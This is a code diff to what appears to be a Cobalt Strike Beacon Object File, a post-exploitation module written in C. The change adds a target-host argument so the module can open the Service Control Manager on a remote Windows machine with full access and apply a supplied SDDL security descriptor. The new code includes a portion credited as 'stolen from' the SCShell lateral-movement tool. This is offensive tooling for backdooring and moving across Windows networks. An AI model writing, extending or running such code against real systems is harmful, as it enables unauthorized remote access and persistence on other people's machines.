@@ -20,11 +20,14 @@ DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
 // Inspired by @0gtweet: https://twitter.com/0gtweet/status/1628720819537936386
 VOID go(char* args, int alen) {
     datap parser;
-    char* pSDDL;
+    CHAR* targetHost;
+    CHAR* pSDDL;
 
     BeaconDataParse(&parser, args, alen);
+    targetHost = BeaconDataExtract(&parser, NULL);
     pSDDL = BeaconDataExtract(&parser, NULL);
 
+    // Stolen from: https://github.com/Mr-Un1k0d3r/SCShell/blob/c6cd4328354b0a33902eea9cba9f459f97f6108c/CS-BOF/scshellbof.c#L40-L55
     HANDLE hToken = NULL;
     if(!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
         BeaconPrintf(CALLBACK_OUTPUT, "ADVAPI32$OpenProcessToken failed: %ld\n", KERNEL32$GetLastError());
@@ -36,8 +39,10 @@ VOID go(char* args, int alen) {
         return;
     }
 
+    BeaconPrintf(CALLBACK_OUTPUT, "Trying to connect to %s...\n", targetHost);
+
     SC_HANDLE scManager = NULL;
-    if (!(scManager = ADVAPI32$OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS))) {
+    if (!(scManager = ADVAPI32$OpenSCManagerA(targetHost, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS))) {
         BeaconPrintf(CALLBACK_OUTPUT, "ADVAPI32$OpenSCManager failed: %ld\n", KERNEL32$GetLastError());
         return;
     }
